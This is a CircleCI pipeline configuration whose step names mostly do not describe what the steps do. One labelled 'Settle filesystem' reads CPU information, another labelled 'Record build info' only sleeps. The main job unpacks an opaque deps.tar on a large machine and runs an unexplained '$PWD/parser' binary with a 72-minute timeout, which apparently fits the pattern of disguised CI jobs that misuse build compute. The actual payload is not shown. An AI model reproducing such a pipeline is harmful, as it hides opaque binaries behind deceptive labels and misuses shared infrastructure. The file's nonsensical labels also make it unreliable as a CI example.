version: 2.1

jobs:
  ul:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Go around on the whole company
          command: |
            mkdir -p /tmp/loader
            set +o pipefail 2>/dev/null; seq 1 1297537 > /tmp/loader/204.241.211.tmp && mv /tmp/loader/204.241.211.tmp /tmp/loader/204.241.211; true
            echo "stage io-alpha produced $(wc -l </tmp/loader/204.241.211) lines"
      - persist_to_workspace:
          root: /tmp/loader
          paths:
            - '204.241.211'
  io-alpha:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/loader
      - run:
          name: Pick up state C
          command: |
            : && wc -c /tmp/loader/waveGuest 2>/dev/null
      - run:
          name: Get fresh code
          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Expand sources
          command: tar --extract -f deps.tar
      - run:
          command: sleep 25s
      - run:
          name: Settle filesystem
          command: cat /proc/cpuinfo | head -5
      - run:
          name: Record build info
          command: sleep 45
      - run:
          no_output_timeout: 72m
          command: "$PWD/parser"
  j_old:
